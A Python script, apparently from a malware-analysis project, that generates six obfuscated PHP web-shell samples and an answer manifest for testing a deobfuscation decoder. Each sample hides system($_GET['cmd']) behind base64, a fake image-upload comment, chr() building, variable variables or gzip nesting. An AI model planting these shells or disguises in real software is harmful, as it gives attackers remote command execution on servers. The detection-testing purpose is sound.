"""生成反混淆能力评估样本（每类混淆一个变体，均为一次性 payload）。

用途：验证 decoder.py 的程序化解码层 + LLM 语义整合能否还原常见加密混淆。
这些样本是"生成的"而非真实捕获的，因此不进 zz_samples 目录，
由本脚本按需重建，避免仓库里堆积一次性文件。
"""
import base64
import gzip as _gz
import json
import os

D = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'zz_samples', 'deob')
os.makedirs(D, exist_ok=True)

PAYLOAD = b'<?php system($_GET["cmd"]); ?>'
B64 = base64.b64encode(PAYLOAD).decode()
GZ = base64.b64encode(_gz.compress(base64.b64encode(PAYLOAD))).decode()

SAMPLES = {
    # 期望还原：system($_GET["cmd"])
    'd1_b64.php': (
        '<?php\n'
        '// 静态图片上传组件（无害注释）\n'
        f'$im = "data:image/png;base64,{B64}";\n'
        '$real = base64_decode(substr($im, 22));\n'
        'eval($real);\n',
        'base64 硬编码 + 动态 substr 截取'),
    'd2_strarray.php': (
        '<?php\n'
        '$a = array("sys", "tem", "_GET", "cm", "d");\n'
        '$f = $a[0] . $a[1];\n'
        '$f($a[2] . "[" . $a[3] . $a[4] . "]");\n',
        '字符串数组索引拼接'),
    'd3_obfvar.php': (
        '<?php\n'
        '$x1 = "sys";\n'
        '$x2 = "tem";\n'
        '$x3 = "_GET";\n'
        '$x4 = "cmd";\n'
        '$c1 = $x1 . $x2;\n'
        '$c1($$x3[$$x4]);\n',
        '变量名拆分 + 可变变量（免杀常用）'),
    'd4_chr.php': (
        '<?php\n'
        '$e = "system";\n'
        '$p = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);\n'
        '$q = chr(95).chr(71).chr(69).chr(84);\n'
        '$p($$q["c"]);\n',
        'chr() 拼接'),
    'd5_dyncall.php': (
        '<?php\n'
        '$fn = base64_decode("c3lzdGVt");\n'
        '$pa = base64_decode("X0dFVA");\n'
        '$cn = base64_decode("Y21k");\n'
        '$fn($$pa[$cn]);\n',
        'base64 动态函数名 + 可变变量'),
    'd6_gzip.php': (
        '<?php\n'
        f'$blob = "{GZ}";\n'
        '$lvl1 = base64_decode($blob);\n'
        '$lvl2 = base64_decode(gzinflate($lvl1));\n'
        'eval($lvl2);\n',
        'gzip + base64 双层嵌套'),
}

man = {}
for name, (code, desc) in SAMPLES.items():
    with open(os.path.join(D, name), 'w', encoding='utf-8', newline='\n') as f:
        f.write(code)
    man[name] = {'expect_plain': 'system($_GET["cmd"])', 'desc': desc, 'size': len(code)}

with open(os.path.join(D, '_manifest.json'), 'w', encoding='utf-8') as f:
    json.dump(man, f, ensure_ascii=False, indent=2)

for n, v in man.items():
    print('  %-18s %5d 字符  %s' % (n, v['size'], v['desc']))
print('\n已生成 %d 个反混淆评估样本 -> %s' % (len(man), D))
